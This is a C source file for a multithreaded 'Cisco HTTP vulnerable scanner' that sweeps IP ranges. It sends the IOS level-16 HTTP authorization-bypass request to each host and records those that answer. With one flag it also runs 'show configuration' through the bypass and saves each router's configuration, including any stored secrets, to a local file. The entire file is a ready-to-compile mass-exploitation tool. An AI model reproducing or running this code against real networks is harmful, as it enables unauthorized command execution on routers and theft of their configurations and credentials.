/*
        Multi-thread Cisco HTTP vulnerable scanner v0.2
		by Inode <inode@wayreth.eu.org>
	
	You can download the latest version at: http://www.wayreth.eu.org

	Thanks Megat0n for programming support

	Tested on:
		Linux Slackware 8.0 (i386)
		OpenBSD 3.3 (i386)
		SunOS 5.8 (sparc)

	Compile:
		- Linux / OpenBSD
			gcc -O2 -o cisco_scanner cisco_scanner.c -lpthread
		- FreeBSD
			gcc -O2 -o cisco_scanner cisco_scanner.c -pthread
		- SunOS
			gcc -O2 -o cisco_scanner cisco_scanner.c -DSOLARIS -lpthread -lxnet

	Changes 0.2:
		- Added the fetch configuration

	 $ver=v0.2 $name=cisco scanner 

*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <signal.h>
#include <sys/types.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/time.h>
#include <errno.h>

#define MAX_THREAD 250 
#define DEF_THREAD 30
#define TIMEOUT 5

#define PORT_SSH 22
#define PORT_TELNET 23
#define PORT_HTTP 80 

#define HTTP_REQUEST "GET /level/16/exec/-///pwd  HTTP/1.0\n\n"
#define HTTP_FETCH   "GET /level/16/exec/-///show/configuration HTTP/1.0\n\n"

// Global variables
FILE * OUTFILE;
int verbose = 0;
int timeout = 0;
int fetch = 0;

// Address 
unsigned long current_ip;
unsigned long end_ip;

// Mutex variables
pthread_mutex_t input_queue;
pthread_mutex_t output_file;

// Functions prototipes
void * scan(void * data);
void usage(char * argv);
void connect_ip(unsigned long ip);
int check_telssh( unsigned long ip );
int check_port( unsigned long ip , int port );

/*
	check_port()

	Return Value:
		-1  
		socket number if succeded
*/

int check_port( unsigned long ip , int port )
{
	int sock, flags, flags_old, retval, sock_len;
	struct sockaddr_in sin;
	struct timeval tv;
	fd_set rfds;


	if( ( sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) ) < 0){
		fprintf(stderr, "Can't create  socket try to decrase the number\
		of threads...\n");
		perror("socket");
		return -1;
	}

	// Set connection varibles	
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = ntohl( ip );
	sin.sin_port = htons( port );

	// Set Non Blocking Socket
	flags_old = fcntl( sock, F_GETFL,0);
	flags = flags_old;
	flags |= O_NONBLOCK;
	fcntl( sock, F_SETFL, flags);

	// Connect
	if( connect(sock, (struct sockaddr*) &sin, sizeof(sin) ) == 0 )
		return sock;
 
	// Set timeout
	tv.tv_sec = timeout;
	tv.tv_usec = 0;

	FD_ZERO(&rfds);
	FD_SET(sock, &rfds);
	
	retval = select(FD_SETSIZE, NULL, &rfds, NULL, &tv);

	// if retval < 0 error
	if( retval < 0 ) {
		close( sock );
		return -1;
	}
	sock_len = sizeof( sin );

	// Check if port closed
	if( retval ) 
		if( getpeername( sock, (struct  sockaddr  *) &sin, &sock_len) < 0 ) {
			close( sock );
			return -1;
		} else {
			fcntl( sock, F_SETFL, flags_old);
			return sock;
		}
	close( sock );
	return -1;

}

/*
 
 connect_ip()

 Scan an ip and bruteforce it if ftp is working

*/

void connect_ip(unsigned long ip)
{
	int sock, sock1;
	int ret;
	char buffer[4096];
	struct in_addr t_in;
	FILE * fetch_file = NULL;
	
	t_in.s_addr = ntohl( ip );

	signal(SIGPIPE,SIG_IGN);

	if( verbose != 0)
                fprintf(stderr, "Connecting to: %s on port: %d\n", inet_ntoa(t_in), PORT_HTTP);

	// Connect to port HTTP
	sock = check_port( ip, PORT_HTTP );

	if( sock == -1 )
		return; 

	// Check if SSH or Telent is open	
	sock1 = check_telssh( ip );

	if( sock1 == -1 )
		return;

	// Try to get ACCESS LEVEL 16
	if( send(sock, HTTP_REQUEST, strlen( HTTP_REQUEST ), 0) < 0 )
		return;

	// Get the reponse
	memset( buffer, 0, sizeof( buffer ) );	

	if( ( ret = recv(sock, buffer, sizeof( buffer ) , 0)) < 0 )
		return;

	close( sock );

	if( ret < 5 )
		return;

	if( strstr( buffer, "HTTP/1.0 200 OK") == NULL || strstr( buffer, "cisco") == NULL)
		return;	


	if( fetch != 0 ) {

		if( verbose != 0 )
			fprintf(stderr, "Fetch configuration of: %s\n",inet_ntoa(t_in));
		
		sock = check_port( ip, PORT_HTTP );

		if( sock == -1 )
			return;	

		sprintf(buffer, "%s.conf", inet_ntoa(t_in) );

		if( ( fetch_file = fopen(buffer, "w") ) == NULL ) {
			fprintf(stderr, "Can't create config file...\n\n");
			close( sock );
			exit(0);
		}

	        if( send(sock, HTTP_FETCH, strlen( HTTP_FETCH ), 0) == -1 ) {
			close( sock );
			fclose( fetch_file );
			return;
		}

		memset( buffer, 0, sizeof( buffer ) );

		while( recv(sock, buffer, sizeof( buffer ) , 0) ) {

			fprintf( fetch_file, "%s", buffer);

			if( strstr( buffer, "command completed") != NULL )
				break; 

			memset( buffer, 0, sizeof( buffer ) );
		};

		close( sock );
		fclose( fetch_file );
			
	}

	pthread_mutex_lock(&output_file);

	fprintf(OUTFILE,"IP: %s\n",inet_ntoa(t_in) );
	fflush( OUTFILE );

	pthread_mutex_unlock(&output_file);

	return;
}

/*

 main()

*/

int main(int argc, char **argv) {

        int i,number_thread = 0;
	char * out_file = NULL;
	char opt;
	char * hosts = NULL;
	unsigned long mask = 0xffffffff;
	char * maskarg = (char *)NULL;
	struct in_addr t_in;

        pthread_t thread_id[MAX_THREAD];
       
	fprintf( stderr, "\n Multi-thread cisco HTTP vulnerable scanner v0.2\n   by Inode <inode@wayreth.eu.org>\n\n");	
 
        // Check arguments
	while((opt = getopt(argc, argv, "t:c:h:o:vf")) != -1)
	{
		switch (opt)
                {
			case 't':
				timeout =  atoi( optarg );
				break;
			case 'c':
				number_thread = atoi( optarg );
				break;	
			case 'h':
				hosts = optarg;
				break;
			case 'o':
				out_file = optarg;
				break;
			case 'v':	
				verbose = 1;
				break;
			case 'f':
				fetch = 1;
				break;
			default:
				usage(argv[0]);
				break;
		}
	}
	
	if( hosts == NULL) 
		usage(argv[0]);

	// Set DEFAULT values
	if( timeout == 0)
		timeout = TIMEOUT;       

	if( number_thread == 0)
		number_thread = DEF_THREAD;

	if( number_thread > MAX_THREAD) {
		fprintf( stderr, " Max num of thread...\n\n");
		exit(0);
	}

	if( out_file == NULL ) {
		out_file = (char *)strdup("/dev/stdout");
	}

	if( ( OUTFILE = fopen( out_file, "a+" ) ) == NULL ) {
		fprintf( stderr, "Can't open output file\n");
		exit(0);	
	}

        if( (maskarg = (char *)strchr(hosts,'/')) ) {
                *maskarg = 0;
                maskarg++;
        }               
                
        if( maskarg ) {
                mask = (mask << ((unsigned long)(32 - atol(maskarg))));
        } else {
                mask = mask;
        }       

        current_ip = ntohl((unsigned long)inet_addr(hosts)) & mask;

	end_ip = current_ip | ~mask;

	if( verbose > 0 ) {
		t_in.s_addr = ntohl( current_ip );
		fprintf(stderr, "Start IP: %s\n", inet_ntoa(t_in) );
		t_in.s_addr = ntohl( end_ip );
		fprintf(stderr, "End   IP: %s\n", inet_ntoa(t_in) );
	}

        // Inizialize mutex variables
        pthread_mutex_init(&input_queue, NULL);
	pthread_mutex_init(&output_file, NULL);
	// For solaris compatibility 
	#ifdef SOLARIS
	pthread_setconcurrency( number_thread );
	#endif

	signal(SIGPIPE,SIG_IGN);

        for( i = 0 ; i < number_thread; i++)
                if( pthread_create( &thread_id[i], NULL, &scan, NULL) != 0 ) {
                        i--;
			fprintf(stderr,"\nError in creating thread\n");
                }
        
        for( i = 0 ; i < number_thread; i++)
                if( pthread_join( thread_id[i], NULL) != 0 ) {
                        fprintf(stderr,"\nError in joining thread\n");
                }


	fflush( OUTFILE );

	fclose( OUTFILE );

	fprintf(stderr, " Scan end...\n\n");

        return 0;
}               
                
        
void usage(char * argv)
{
	fprintf( stderr, " Usage:\n");
	fprintf( stderr, "  %s -h <arg> [-t <arg>] [-c <arg>] [-o <arg>] [-v]\n\n",argv); 
	fprintf( stderr, " -h Host/s to scan  (ex 192.168.0.0/24)\n");
	fprintf( stderr, " -t Timeout in seconds  (default 5)\n");
	fprintf( stderr, " -c Number of thread  (default 20)\n");
	fprintf( stderr, " -o Output file\n");
	fprintf( stderr, " -v Verbose mode\n");
	fprintf( stderr, " -f Fetch config and save\n");
	fprintf( stderr, "\n");
	exit(0);
}

void * scan(void * data)
{
	unsigned long ip;

        while ( 1 )
        {

                pthread_mutex_lock(&input_queue);

		if( current_ip > end_ip ) {
			pthread_mutex_unlock(&input_queue);
			break;
		}

		ip = current_ip;

		current_ip ++;

                pthread_mutex_unlock(&input_queue);

                connect_ip( ip );


        }

        return NULL;
}

/*

 Return Value:
	0	Nothing open
	23	Telnet Open
	22	SSH Open
	45	Both Open

*/

int check_telssh( unsigned long ip )
{
	int sock;
	int ret = 0;
	struct in_addr t_in;

	t_in.s_addr = ntohl( ip );

	if( verbose != 0 )
		fprintf(stderr, "Connecting to: %s on port: %d\n", inet_ntoa(t_in), PORT_TELNET );	

	sock = check_port( ip , PORT_TELNET );

	if( sock > 0 ) { 
		ret += PORT_TELNET;
		close( sock );
	}	

	if( verbose != 0 )
		fprintf(stderr, "Connecting to: %s on port: %d\n", inet_ntoa(t_in), PORT_SSH );
	
	sock = check_port( ip , PORT_SSH );

	if( sock > 0 ) {
		ret += PORT_SSH;
		close( sock );
	}

	return ret;
}

